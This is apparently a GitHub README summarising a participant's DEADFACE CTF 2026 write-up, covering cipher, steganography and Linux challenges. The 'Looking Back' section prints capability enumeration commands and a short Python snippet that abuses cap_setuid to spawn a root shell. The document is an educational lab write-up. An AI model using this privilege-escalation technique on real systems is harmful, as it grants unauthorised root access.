# 💀 DEADFACE CTF 2026

> **Breaking ciphers, hunting flags, escalating privileges, and learning along the way.**

Welcome to my write-up for the **DEADFACE CTF 2026**.

I participated in DEADFACE as a way to challenge myself, strengthen my practical cybersecurity skills, and gain more experience approaching problems that don't always have an obvious solution.

Rather than only collecting flags, I documented my thought process, tools, commands, failed ideas, and eventual solutions.

---

## 🧠 What is DEADFACE?

DEADFACE is a cybersecurity Capture the Flag competition built around a fictional cybercriminal organization known as **DEADFACE**.

Throughout the event, participants investigate incidents, decode messages, analyze files, enumerate systems, and uncover flags hidden throughout different challenges.

Flags follow the format:

```text
deadface{flag_here}
```

---

# 🏴 Challenges Completed

## 🔐 Cryptography

### 🐕 Hail Caesar

**Difficulty:** Beginner  
**Points:** 5

A password hint was discovered containing an encoded message and a SHA-256 hash.

The challenge required me to:

- Identify the cipher being used
- Decode the original message
- Recognize that part of the decoded text was still incorrect
- Generate possible answers
- Compare SHA-256 hashes
- Verify the correct result

### Skills Practiced

`ROT13` `Cryptography` `SHA-256` `Pattern Recognition` `Hash Verification`

---

## 👻 Infrequent Emojis

**Points:** 50

One of my favorite challenges from the event.

A DoomScroll post contained an entire message written using emojis.

At first it looked completely random, but repeated patterns, spacing, punctuation, and known flag formatting provided enough information to begin building an **emoji-to-letter substitution cipher**.

Some of the biggest clues came from:

- Recognizing the `deadface{}` flag structure
- Identifying repeated three-letter words
- Comparing repeating symbols
- Using common English word patterns
- Recognizing a reference to `UTF-8`
- Gradually constructing a substitution table

Eventually, the entire emoji message could be decoded.

### Skills Practiced

`Cryptanalysis` `Substitution Ciphers` `Pattern Recognition` `Unicode` `UTF-8` `Logical Reasoning`

---

# 🐧 Hostbusters

## 🚪 Foothold on Charon

**Points:** 10

This challenge provided access to a Linux environment under the `svc-deploy` account.

I started with basic Linux enumeration to determine:

- Which user I was logged in as
- What files were available
- Whether any immediately accessible files contained useful information

Simple commands such as:

```bash
whoami
ls
cat flag.txt
```

were enough to locate the first flag and establish the foothold.

### Skills Practiced

`Linux` `Command Line` `Enumeration` `File System Navigation`

---

## 👑 Looking Back

This challenge took the Linux investigation further.

Starting as the low-privileged `svc-deploy` user, I began enumerating the system looking for possible privilege escalation paths.

Some of the checks included:

```bash
id
```

```bash
find / -type f -perm -4000 2>/dev/null
```

```bash
ls -la /.dockerenv
```

```bash
getcap -r / 2>/dev/null
```

During enumeration, I discovered:

```text
/opt/crypto/pytool
```

with the Linux capability:

```text
cap_setuid=ep
```

This meant the executable had permission to modify its process user ID.

After determining that the executable behaved as a Python interpreter, I tested whether it could change its UID:

```python
import os
os.setuid(0)
print("UID:", os.getuid(), "EUID:", os.geteuid())
```

The result returned:

```text
UID: 0
EUID: 0
```

I then used the interpreter to spawn a privileged shell.

```python
import os
os.setuid(0)
os.execl("/bin/sh", "sh")
```

Running:

```bash
id
```

confirmed successful privilege escalation to:

```text
UID 0 (root)
```

From there, I was able to investigate other user directories and locate the challenge flag.

### 🔎 What I Learned

This challenge demonstrated how dangerous incorrectly assigned **Linux capabilities** can be.

Giving `CAP_SETUID` to an executable capable of running arbitrary code can allow a low-privileged user to change their UID to `0`, effectively gaining root access.

### Skills Practiced

`Linux Privilege Escalation`  
`Linux Capabilities`  
`Enumeration`  
`Docker`  
`Python`  
`UID / EUID`  
`SUID Investigation`

---

# 🖼️ Steganography

## 📸 Headshot

DEADFACE had reportedly compromised a collection of corporate employee headshots and was suspected of modifying one of the files.

The objective was to determine which image had been tampered with.

I analyzed the supplied images looking for unusual or hidden information and discovered that one image contained data associated with the DEADFACE flag.

### Skills Practiced

`Steganography` `Image Forensics` `Metadata Analysis` `File Analysis`

---

# 🛠️ Tools & Technologies

Throughout the CTF I worked with tools and techniques including:

```text
🐧 Linux
🔎 Linux Enumeration
🐍 Python
🔐 ROT / Caesar Ciphers
#️⃣ SHA-256
👻 Substitution Ciphers
🌐 Unicode / UTF-8
📁 File Analysis
🖼️ Image Forensics
🐳 Docker Enumeration
🔑 Linux Capabilities
🔍 Google / GitHub Research
```

---

# 🎯 What I Took Away From The CTF

One of the biggest things I learned from DEADFACE wasn't a specific command or exploit.

It was the importance of **investigation**.

When something didn't immediately make sense, I had to:

1. Gather information.
2. Look for patterns.
3. Form a theory.
4. Test it.
5. Fail.
6. Adjust the theory.
7. Test again.
8. Document what worked.

Some challenges only required a few Linux commands.

Others required decoding messages, researching unfamiliar concepts, or understanding why a system configuration could create a security vulnerability.

That problem-solving process is what made the event valuable.

---

# 📚 Full Write-Up

My complete write-up contains my investigation process, commands, discoveries, screenshots, tools, and solutions for each challenge.

📄 **[View the DEADFACE CTF Write-Up](./Deadface-CTF-Writeup.pdf)**

---

# ⚠️ Disclaimer

This repository documents challenges completed in an authorized **Capture the Flag environment**.

All techniques shown here were performed for educational purposes against systems intentionally designed for cybersecurity training.

Do not use these techniques against systems without explicit authorization.

---

# 🚀 What's Next?

I'm continuing to build my cybersecurity skills through:

- Capture The Flag competitions
- Linux labs
- Privilege escalation practice
- Digital forensics
- Networking
- Security research
- Hands-on cybersecurity projects

More write-ups coming soon.

---

### 💀 DEADFACE CTF 2026

**October 18, 2026**

`Cybersecurity` • `CTF` • `Linux` • `Cryptography` • `Privilege Escalation` • `Digital Forensics`
